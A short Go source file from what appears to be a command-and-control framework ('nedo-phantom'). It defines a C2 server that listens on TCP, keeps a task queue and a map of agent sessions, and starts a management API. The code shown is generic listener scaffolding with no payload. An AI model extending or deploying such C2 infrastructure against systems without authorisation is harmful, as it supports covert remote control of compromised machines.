package server

import (
    "fmt"
    "net"
    "nedo-phantom/internal/c2/api"
    "nedo-phantom/internal/c2/db"
)

type Server struct {
    addr   string
    tasks  *db.TaskQueue
    agents map[string]*AgentSession
}

func NewServer(addr string) *Server {
    return &Server{
        addr:   addr,
        tasks:  db.NewTaskQueue(),
        agents: make(map[string]*AgentSession),
    }
}

func (s *Server) Run() error {
    listener, err := net.Listen("tcp", s.addr)
    if err != nil {
        return err
    }
    defer listener.Close()
    
    fmt.Printf("[C2] Server listening on %s\n", s.addr)
    
    // Запускаем API сервер для управления
    go api.StartAPI(s.tasks)
    
    for {
        conn, err := listener.Accept()
        if err != nil {
            fmt.Printf("Accept error: %v\n", err)
            continue
        }
        go s.handleAgent(conn)
    }
}
